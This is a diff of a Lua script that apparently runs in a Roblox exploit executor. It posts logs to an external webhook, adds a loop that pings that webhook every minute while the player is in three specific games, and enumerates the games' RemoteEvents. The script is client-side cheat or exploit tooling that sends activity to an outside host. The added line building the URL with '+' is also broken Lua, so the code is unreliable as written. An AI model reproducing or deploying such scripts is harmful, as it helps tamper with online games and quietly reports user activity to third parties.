@@ -1,6 +1,9 @@
 local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 local HttpService = game:GetService("HttpService")
 
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+
 local headers = {
     ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
     ["Content-Type"] = "application/json",
@@ -10,7 +13,7 @@ local headers = {
 local function submitLog(content)
     local response =
         request({
-            Url = Webhook,
+            Url = Webhook + "/log",
             Method = "POST",
             Headers = headers,
             Body = content
@@ -38,6 +41,13 @@ end]]
 
     wait(5)
 end]]
+
+while game.PlaceId == 142823291 or game.PlaceId == 335132309 or game.PlaceId == 636649648 do
+    submitLog("ping")
+    print(plr)
+
+    wait(60)
+end
 
 for _, event in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
     if event:IsA("RemoteEvent") then
